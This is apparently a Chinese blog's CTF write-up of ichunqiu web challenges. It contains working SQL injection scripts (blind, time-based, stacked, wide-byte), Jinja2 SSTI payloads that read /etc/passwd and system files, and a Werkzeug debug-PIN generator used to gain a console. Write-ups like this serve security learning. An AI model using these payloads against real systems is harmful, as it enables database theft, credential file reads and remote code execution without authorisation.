<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>Tag: 反序列化逃逸漏洞 - ggb0n&#039;s Blog</title><meta description="网络安全, CTF, 机器学习"><meta property="og:type" content="website"><meta property="og:title" content="ggb0n"><meta property="og:url" content="http://ggb0n.cool/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="网络安全, CTF, 机器学习"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:author" content="ggb0n"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/"},"headline":"ggb0n","image":["http://www.ggb0n.cool/images/back2.png"],"author":{"@type":"Person","name":"ggb0n"},"description":"网络安全, CTF, 机器学习"}</script><link rel="alternative" href="http://ggb0n.cool/search.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">反序列化逃逸漏洞</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-21T14:14:19.000Z">2020-02-21</time><span class="level-item">an hour read (About 9198 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/">ichunqiu新春战疫赛-WriteUp</a></h1><div class="content"><h2 id="Web-简单的招聘系统"><a href="#Web-简单的招聘系统" class="headerlink" title="Web-简单的招聘系统"></a>Web-简单的招聘系统</h2><p>考察SQL注入</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>测试发现登录的<code>username</code>处存在注入，万能密码就能登录<br><img src="http://www.ggb0n.cool/images/ichunqiu0.png" alt=""><br>这个地方存在注入点，可以利用盲注爆库，这里利用的思路就是通过判断用户名的条件为<code>true</code>登录进行注入，当然还需要一个现有的用户来登录，那么我们注册个用户就行了，参考如下的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select database()),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line">payload = <span class="string">"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># backup flag  user           flag: id  flaaag</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-&#123;&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"lname"</span>: payload.format(i, database + n),</span><br><span class="line">            <span class="string">"lpass"</span>: <span class="string">"xxx"</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data)</span><br><span class="line">        req.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="comment"># print(req.encoding)</span></span><br><span class="line">        print(data[<span class="string">"lname"</span>])</span><br><span class="line">        <span class="comment"># print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"成功"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text.encode(<span class="string">'gbk'</span>).decode(req.apparent_encoding):</span><br><span class="line">            print(<span class="string">"*                      "</span> + n)</span><br><span class="line">            database += n</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-ezupload"><a href="#Web-ezupload" class="headerlink" title="Web-ezupload"></a>Web-ezupload</h2><p>文件上传题</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>本以为是一道拐弯的上传题，结果直接传上马了…<br>蚁剑连上，<code>flag</code>文件是空的，但是下面有个<code>/readflag</code>文件，开中断运行这个程序就能拿到flag。<br><img src="http://www.ggb0n.cool/images/ichunqiu2.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu3.png" alt=""></p>
<h2 id="Web-盲注"><a href="#Web-盲注" class="headerlink" title="Web-盲注"></a>Web-盲注</h2><p>利用正则进行时间盲注</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>题目已经说的很明显了，需要进行盲注，但是有waf，过滤了很多常用的注入语句，但是<code>REGEXP</code>并没有被ban，那么利用这个函数很简单地就能拿到flag。<br><code>REGEXP</code>：在列值内进行匹配，如果被匹配的文本在列值中出现，<code>REGEXP</code>将会找到它，相应的行将被返回，<code>REGEXP</code>能匹配整个列值。并且<code>REGEXP</code>检查总是返回<code>0（没有匹配）</code>或<code>1（匹配）</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            payload = <span class="string">'1 and if((fl4g    REGEXP "^&#123;0&#125;"),sleep(3),5);'</span></span><br><span class="line">            payload = payload.format(flag+n)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            req = requests.get(url+payload)</span><br><span class="line">            <span class="comment">#print(req.text)</span></span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time)&gt;<span class="number">2</span>:</span><br><span class="line">                print(flag)</span><br><span class="line">                flag += n</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-blacklist"><a href="#Web-blacklist" class="headerlink" title="Web-blacklist"></a>Web-blacklist</h2><p>本题是[强网杯]随便注的改版，考察堆叠注入，这题get到注入新姿势，利用<code>mysql</code>数据库中<code>HANDLER</code>绕过黑名单拿flag。</p>
<h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>进入题目发现跟强网杯一样的输入框，首先就想到了堆叠注入，测试一下：<br><img src="http://www.ggb0n.cool/images/ichunqiu4.png" alt=""><br>可以看到，语法成功执行了。<br>但是再去测试其他关键字的时候发现很多关键字被ban了：<br><img src="http://www.ggb0n.cool/images/ichunqiu5.png" alt=""><br>本想着利用强网杯的方法，通过改表名来拿flag的，但是<code>rename</code>也被ban了，结合<code>select</code>又被ban，常规的姿势怕是不行，后来借用<code>handler</code>才拿到flag，payload如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/ichunqiu6.png" alt=""><br>关于<code>handler</code>可以参考<a href="https://www.jb51.net/article/88732.htm">这里</a>。</p>
<h2 id="Web-easysqli-copy"><a href="#Web-easysqli-copy" class="headerlink" title="Web-easysqli_copy"></a>Web-easysqli_copy</h2><p>还是考察PDO、check()函数的绕过、实际盲注，不过这题也get到了新姿势：利用<code>预处理语句</code>进行堆叠注入，这也是采用了PDO之后注入的新趋势了。<br>扩展一下知识：</p>
<blockquote>
<p>在php中，<code>PDO</code>有两种模式：<code>模拟预编译</code>与<code>非模拟预编译</code>。默认为模拟预编译模式，即不是真正的预编译，而是采用<code>PDO::quote()</code>函数，首先将用户输入转化为字符型，之后将引号等敏感字符转义。这样在<code>gbk</code>编码下，即可通过宽字节注入绕过防护。<br>但是绕过PDO之后，依然很难绕过<code>check()</code>函数，于是此处利用到了PDO的第二个默认特性：支持<code>多句执行</code>，即可进行堆叠注入。</p>
</blockquote>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目给出了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过源码发现，这里利用了<a href="https://www.runoob.com/php/pdo-query.html">PDO</a>接口进行与数据库的链接，其中<code>prepare</code>就是准备了一个预处理语句，<code>$row-&gt;bindParam(1,$id);</code>中的<a href="https://www.runoob.com/php/pdostatement-bindparam.html">binParam</a>作用是绑定一个参数到指定的变量名。<br>请教别的师傅了解到PDO中单引号可能是被自动过滤的，那就只好利用宽字节绕过：<code>%df%27</code>，源码里利用了预处理语句，注入的时候也就选择了利用预处理语句进行注入，同时结合16进制编码绕过对关键字的过滤。</p>
<h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;'</span></span><br><span class="line">    payloads = <span class="string">"set @a=0x&#123;0&#125;;prepare ctftest from @a; execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        print(<span class="string">"前&#123;0&#125;位"</span>.format(m))</span><br><span class="line">        payload = <span class="string">"select if (ascii(mid((select fllllll4g from table1 ),&#123;0&#125;,1))=&#123;1&#125;, sleep(3), 1)"</span>  <span class="comment"># 由于我们会转换为十六进制，所以不存在任何过滤，关键词随便使用</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="comment"># print(payload.format(m, n))</span></span><br><span class="line">            xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n))))</span><br><span class="line">            <span class="comment"># print(xxx)</span></span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(xxx)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">                flag += n</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])  <span class="comment"># 字符串转换为16进制的函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="Web-Easqli"><a href="#Web-Easqli" class="headerlink" title="Web-Easqli"></a>Web-Easqli</h2><p>考察盲注，这题也学到了新姿势：在<code>union select</code>被ban的情况下，进行<code>多列</code>数据的爆破。</p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个大大的输入框，多次尝试发现输入<code>1</code>的时候回显<code>Hello Nu1L</code>，输入<code>0</code>的时候回显<code>hello</code>，后来测试了多个关键字，发现<code>union select</code>单用的时候没问题，联合起来使用怎么都绕不过，<code>or</code>、<code>and</code>也被ban了，但是<code>&amp;&amp;</code>没被ban，这里有搞头，然后测了一下，语句为<code>true</code>回显也是<code>hello Nu1L</code>，就从这里下手了。<br>后来又发现<code>information_schema</code>也被ban了，这时候想到了之前一个题里讲过的：利用mysql系统库<code>sys.schema_table_statistics_with_buffer</code>或者<code>sys.schema_auto_increment_columns</code>获取到了表名，但是因为<code>union select</code>被ban，无列名注入也没法进行，这时候就用到了前面说的学到的新姿势了：利用<code>id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;</code>这样的语句使进行两列的对比，从而爆破出第二列(flag列)的内容。脚本如下：</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select database()),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #不可用，需要进行无列名查询</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #不可用，因为有两列</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'0123456789bcdehijkmnopqrstuvwxyz_-&#123;&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1, 80):</span></span><br><span class="line"><span class="string">    for n in letter:</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            "id": payload.format(i, database + n),</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        req = requests.post(url, data=data,headers=headers)</span></span><br><span class="line"><span class="string">        # print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line"><span class="string">        if "Hello Nu1L" in req.text:</span></span><br><span class="line"><span class="string">            print(n)</span></span><br><span class="line"><span class="string">            flag += n</span></span><br><span class="line"><span class="string">            print(database)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">                a = chr(i).encode().hex()</span><br><span class="line">                payload = <span class="string">"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>%(flag.encode().hex()+a) <span class="comment">#创建两列数据去比较</span></span><br><span class="line">                <span class="comment">#print("Test:"+chr(i))</span></span><br><span class="line">                html = requests.post(url=url,data=payload,headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Hello Nu1L"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                        flag += chr(i<span class="number">-1</span>)</span><br><span class="line">                        print(<span class="string">"Find:"</span>+flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> chr(i) == <span class="string">'&#125;'</span>:</span><br><span class="line">                flag +=<span class="string">'&#125;'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Web-FlaskApp"><a href="#Web-FlaskApp" class="headerlink" title="Web-FlaskApp"></a>Web-FlaskApp</h2><p>考察SSTI</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现是一个base64加密解密网站，直接考虑SSTI了。并且这个题跟另外一个利用Flask写的加密的题很像，便参考了那个题的<a href="https://www.anquanke.com/post/id/197602?display=mobile">解题思路</a>：在开启DEBUG模式的情况下进行模板注入。<br>首先测试一下SSTI是否能用：先在加密页面对<code></code>加密一下，然后到解密页解密，页面回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu8.png" alt=""><br>由此得知，确实是SSTI，同时还看到了开启了DEBUG模式。<br>那就利用那道题的解题思路去做吧。</p>
<h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p>参考前面的链接我们知道，这道题可以通过计算出<code>PIN</code>来登录控制台，然后在控制台进行操作拿flag。但是生成<code>PIN</code>的脚本需要知道<code>username</code>(这个需要我们自己去找)、<code>modname</code>(一般是<code>flask.app</code>)、第三个值<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>(一般是<code>Flask</code>)、第四个值<code>getattr(mod, &quot;__file__&quot;, None)</code>(在报错页面可以看到题目的环境)、第五个是<code>str(uuid.getnode())</code>的值，最后是机器码。<br>报错页面回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu9.png" alt=""></p>
<h4 id="获取username"><a href="#获取username" class="headerlink" title="获取username"></a>获取username</h4><p>可以在<code>/etc/passwd</code>中读取到用户名，这里由于题目环境是Python3的，因此读文件需要用如下payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果环境是Python2，payload可以构造为：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>跟前面的操作一样，先编码，再去解码引发SSTI，回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu13.png" alt=""><br>我们看到可以用户名<code>flaskweb</code>，应该就是它了。</p>
<p><code>modename</code>以及第三个、第四个已经知道了，直接去找<code>str(uuid.getnode())</code>的值。</p>
<h4 id="获取str-uuid-getnode"><a href="#获取str-uuid-getnode" class="headerlink" title="获取str(uuid.getnode())"></a>获取str(uuid.getnode())</h4><p>构造payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>按照同样的方法进行注入，得到回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu14.png" alt=""><br>然后到<a href="https://tool.oschina.net/hexconvert/">进制转换网站</a>转换为十进制。</p>
<h4 id="获取机器码"><a href="#获取机器码" class="headerlink" title="获取机器码"></a>获取机器码</h4><p>构造payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu15.png" alt=""><br>第一项<code>/docker/</code>后面的字符串即为我们要找的机器码。<br>至此，拿到了生成<code>PIN</code>的所有的要素了，利用下面的脚本生成<code>PIN</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957890'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>然后到题目的链接后面加上<code>/console</code>进入控制面板，输入PIN，获取权限：<br><img src="http://www.ggb0n.cool/images/ichunqiu16.png" alt=""><br>然后就可以随意输入读取文件拿flag了(注意列举文件的时候也可以直接列举根目录的<code>ls /</code>)：<br><img src="http://www.ggb0n.cool/images/ichunqiu17.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu18.png" alt=""></p>
<h2 id="Web-easy-thinking"><a href="#Web-easy-thinking" class="headerlink" title="Web-easy_thinking"></a>Web-easy_thinking</h2><p>考察<code>ThinkPHP6.0</code>存在的通过<code>SESSION</code>写文件的漏洞，同时也考察了对<code>disable_functions</code>的绕过。<br>这一道题比赛的时候知道考察点是SESSION漏洞了，但是由于时间原因当时没有做出来，后来经smity师傅提示，结合getfly师傅的题解，对这道题加深了理解和学习。在BUU上复现了一下。</p>
